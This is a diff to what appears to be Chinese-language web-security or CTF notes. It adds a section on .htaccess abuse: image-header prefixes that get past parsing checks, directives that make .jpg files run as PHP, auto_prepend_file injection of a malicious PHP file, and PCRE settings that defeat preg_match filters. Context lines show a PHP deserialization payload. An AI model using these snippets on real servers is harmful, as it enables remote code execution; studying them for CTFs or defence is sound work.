@@ -98,3 +98,55 @@ O:4:"Name":2:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
 ```
 O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
 ```
+
+## ``.htaccess``文件利用
+
+- 正确解析绕过
+  
+  ``.htaccess``中出现的无法正常解析的条目时无法生效
+  
+  - 利用XMP图片解析头(``#``刚好是注释符)
+    
+    ```
+    #define width 1
+    #define height 1
+    ```
+  - 利用wbmp文件解析头
+    
+    ```
+    \x00\x00\x8a\x39\x8a\x39
+    ```
+- 增加使用php解析的文件后缀(.jpg)
+    
+    ```
+    application/x-httpd-php .jpg
+    ```
+- 增加使用php解析的文件
+  
+    ```
+    <FilesMatch "<filename>">
+    SetHandler application/x-httpd-php
+    </FilesMatch>
+    ```
+
+- **利用php_value注入php配置**
+
+    - 在所有php前后注入恶意php文件
+        
+        ```
+        php_value auto_prepend_file "<phpFileDir>"
+        php_value auto_append_file "<phpFileDir>"
+        ```
+        
+    - 利用prce参数绕过preg_match
+        
+        ```
+        php_value pcre.backtrack_limit 0
+        php_value pcre.jit 0 
+        ```
+
+        任意匹配均返回``FALSE``
+        
+        > https://www.php.net/manual/zh/pcre.configuration.php
+    
+    
